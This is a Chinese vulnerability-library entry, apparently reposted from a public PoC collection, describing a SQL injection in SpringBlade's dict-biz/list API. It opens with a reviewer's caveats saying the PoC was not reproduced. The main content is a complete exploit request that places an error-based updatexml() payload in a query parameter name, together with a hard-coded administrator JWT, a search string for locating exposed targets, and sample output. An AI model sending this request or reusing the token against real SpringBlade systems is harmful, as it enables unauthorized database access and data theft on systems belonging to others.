---
source: "wy876 漏洞文库"
product: "SpringBlade/dict-biz/list"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "SpringBladedict-biz存在SQL注入漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：仅产品名，无版本/修复范围；提供管理员声明JWT，但没有说明有效登录或硬编码密钥伪造前提"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-7a8a5530d68e88b756973bb1"
entity_id: "ve-7a8a5530d68e88b756973bb1"
schema_version: "1"
---

## 核对与使用边界


本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：仅产品名，无版本/修复范围；提供管理员声明JWT，但没有说明有效登录或硬编码密钥伪造前提

代码与实验材料：updatexml(md5(1),user())、HS512令牌，输出只有截断MD5，sqlmap块为空

来源证据范围：转载/语雀来源可追溯，未给对应官方修复提交或完整权限模型

- **代码与转录边界（1）**：输出不足证明user()内容被读取；依据：返回字符串是MD5前缀，MySQL错误长度截断可能吃掉user()；没有完整响应。相应原代码作为存在此问题的历史样本保留，不能直接当作可运行、成功复现的 PoC；缺失内容需回原稿核对，不据此补造可执行攻击链。

- **凭据与会话边界（2）**：教程步骤缺失；依据：sqlmap标题后空代码块，缺版本、修复及令牌来源。抓包中的会话不能视为未认证访问证明。需重新取得授权测试会话，不能复用文中值。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# SpringBlade dict-biz存在SQL注入漏洞

# 一、漏洞简介
SpringBlade dict-biz存在SQL注入漏洞，攻击者利用该漏洞进行SQL注 入攻击

# 二、影响版本
+ SpringBlade

# 三、资产测绘
+ `<font style="color:rgb(63, 63, 63);">body="https://bladex.vip"</font>`


# 四、漏洞复现
```java
GET /api/blade-system/dict-biz/list?updatexml(1,concat(0x7e,md5(1),user(),0x7e),1)=1 HTTP/1.1
Host: 
Blade-Auth:	eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwidXNlcl9pZCI6IjExMjM1OTg4MjE3Mzg2NzUyMDEiLCJyb2xlX2lkIjoiMTEyMzU5ODgxNjczODY3NTIwMSIsInVzZXJfbmFtZSI6ImFkbWluIiwib2F1dGhfaWQiOiIiLCJ0b2tlbl90eXBlIjoiYWNjZXNzX3Rva2VuIiwiZGVwdF9pZCI6IjExMjM1OTg4MTM3Mzg2NzUyMDEiLCJhY2NvdW50IjoiYWRtaW4iLCJjbGllbnRfaWQiOiJzd29yZCIsImV4cCI6MTc5MTU3MzkyMiwibmJmIjoxNjkxNTcwMzIyfQ.wxB9etQp2DUL5d3-VkChwDCV3Kp-qxjvhIF_aD_beF_KLwUHV7ROuQeroayRCPWgOcmjsOVq6FWdvvyhlz9j7A
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
```


```java
c4ca4238a0b923820dcc509a6f75849
```

sqlmap

> 原归档与公开镜像此处的 sqlmap 命令代码块均为空；Yuque 原文受限，原始命令与参数未能恢复。<https://raw.githubusercontent.com/DMW11525708/wiki/main/SpringBlade/SpringBladedict-biz存在SQL注入漏洞.md>

> 原文: <https://www.yuque.com/xiaokp7/ocvun2/wpz38hmzaeugpctm>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
